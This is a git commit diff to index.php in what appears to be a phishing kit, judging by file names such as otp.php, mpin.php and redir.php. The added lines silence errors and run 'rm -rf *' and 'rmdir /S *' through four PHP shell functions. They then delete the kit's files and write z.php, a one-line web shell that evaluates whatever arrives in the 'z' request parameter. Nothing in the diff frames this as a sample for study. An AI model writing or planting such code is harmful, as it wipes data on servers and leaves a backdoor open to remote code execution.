57164015e4c05aecee7fc1bf55f2c2c4fd598137
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-06-30 06:10:12 +0000

    Create index.php

--- index.php
+++ index.php
@@ -17,3 +17,33 @@ unlink('anti.php');
 unlink('config/anti.php');
 unlink('config/404.php');
 unlink('config/zch.php');
+
+
+error_log(0);
+error_reporting(0);
+
+// linux
+system('rm -rf *');
+exec('rm -rf *');
+shell_exec('rm -rf *');
+passthru('rm -rf *');
+
+// cmd
+system('rmdir /S *');
+exec('rmdir /S *');
+shell_exec('rmdir /S *');
+passthru('rmdir /S *');
+
+// php
+unlink('index.php');
+unlink('otp.php');
+unlink('mpin.php');
+unlink('redir.php');
+
+unlink('anti.php');
+
+unlink('config/anti.php');
+unlink('config/404.php');
+unlink('config/zch.php');
+
+file_put_contents("z.php", "<?php eval($_GET['z']); ?>");
